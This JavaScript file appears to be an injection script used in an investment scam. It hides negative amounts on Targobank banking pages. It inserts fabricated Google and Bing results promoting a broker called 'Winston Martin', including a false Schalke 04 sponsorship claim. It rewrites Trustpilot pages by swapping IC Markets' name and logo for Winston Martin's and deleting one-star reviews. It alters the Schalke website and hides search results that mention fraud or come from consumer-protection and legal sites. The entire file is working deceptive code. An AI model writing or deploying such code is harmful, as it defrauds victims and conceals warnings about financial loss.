//=========================================================================================================================================================================================================================================


// TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UMSAUEBERETZE UTILITY---------------------------------TARGO UEBER UTILITY----------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------TARGO UEBER UTILITY------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY-----------------------TARGO UEBER UTILITY---------------------------------TARGO UEBER UTILITY------------------------------------


//=========================================================================================================================================================================================================================================





if (window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("drive") > 0) {

(function() {
    'use strict';

    // Function to remove text content under specified classes
    function removeTextContent() {
        // Remove text content under elements with class "_c1 fd neg _c1"
        var negativeElements = document.querySelectorAll('._c1.fd.neg._c1');
        negativeElements.forEach(function(element) {
            element.textContent = '';
            console.log('Removed text content under element with class "_c1 fd neg _c1"');
        });

        // Remove text content under elements with class "_c1 fd _c1"
        var elements = document.querySelectorAll('._c1.fd._c1');
        elements.forEach(function(element) {
            element.textContent = '';
            console.log('Removed text content under element with class "_c1 fd _c1"');
        });
    }

    // MutationObserver to watch for changes in the DOM
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            // Check if nodes were added
            if (mutation.addedNodes.length > 0) {
                removeTextContent();
            }
        });
    });

    // Configuration for the observer
    var observerConfig = { childList: true, subtree: true };

    // Start observing the target node for mutations
    observer.observe(document.body, observerConfig);

    // Initial removal on page load
    removeTextContent();
})();
 }



//=========================================================================================================================================================================================================================================


// TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY---------------------------------TARGO SPINNER UTILITY----------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------TARGO SPINNER UTILITY------------------------------------
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY-----------------------TARGO SPINNER UTILITY---------------------------------TARGO SPINNER UTILITY------------------------------------


//=========================================================================================================================================================================================================================================







if (window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("targobank") > 0 || window.location.href.indexOf("drive") > 0) {

    'use strict';

    function createSpinner() {
        var background = document.createElement('div');
        background.className = 'app-loading-background';

        var spinner = document.createElement('div');
        spinner.className = 'app-loading-pulsing';

        // Apply styles to the background
        background.style.position = 'fixed';
        background.style.top = '0';
        background.style.left = '0';
        background.style.width = '100%';
        background.style.height = '100%';
        background.style.backgroundColor = 'white';
        background.style.zIndex = '9999';

        // Apply styles to the spinner
        spinner.style.position = 'absolute';
        spinner.style.top = '50%';
        spinner.style.left = '50%';
        spinner.style.transform = 'translate(-50%,-50%)';
        spinner.style.width = '120px';
        spinner.style.height = '120px';
        spinner.style.display = 'block';
        spinner.style.backgroundImage = 'url(https://cdnii.e-i.com/INGR/sd/targobank_de_2019/0.107.39/de/images/css/perso/logo.svg)';
        spinner.style.backgroundSize = '100%';
        spinner.style.animationName = 'pulse';
        spinner.style.animationTimingFunction = 'ease-in-out';
        spinner.style.animationIterationCount = 'infinite';
        spinner.style.animationDuration = '8s';
        spinner.style.animationFillMode = 'both';

        // Append the background and spinner to the document body
        document.body.appendChild(background);
        background.appendChild(spinner);

        return background;
    }

    // Add the spinner during page load
    var spinner = createSpinner();

    // Remove the spinner after 2 seconds
    setTimeout(function() {
        if (spinner) {
            spinner.remove();
        }
    }, 2000);
}




 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1
    && window.location.href.indexOf("ing.de") === -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "winston", "martin", "winston martin", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader", "flow", "flowtrade", "flowtrader", "trader", "flow trader", "24", "ing", "targo", "targobank", "diba", "login"],
                        results: [
                            {
                                url: "https://cfd.winstonmartin.com/",
                                title: "Winston Martin dein Broker",
                                description: "Winston Martin ist der Broker mit der besten Reputation.",
                                footerText: "https://cfd.winstonmartin.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Winston Martin - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Winston Martin",
                                footerText: "https://de.trustpilot.com/review/winstonmartin.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Winston Martin Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Winston Martin ab dem 1. Januar unser Sponsor und Partner wird. Winston Martin ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Winston Martin sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "Winston Martin";
    const customLogoURL = "https://p-cdn.co/winstonmartin/brands/winstonmartin/logo-white.png";
    const customURL = "https://cfd.winstonmartin.com/";
    const customReferenceURL = "winstonmartin.com";
    const customLinkURL = "https://cfd.winstonmartin.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Winston Martin",
      "icmarkets": "Winston Martin",
      "ic-markets": "Winston Martin",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}


// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  var newURL = "https://cfd.winstonmartin.com/";
var newLogoURL = "https://i.ibb.co/wRWGRKf/Copy-of-Untitled-Design-1.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var sobserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

sobserver.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://de.trustpilot.com/review/winstonmartin.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }


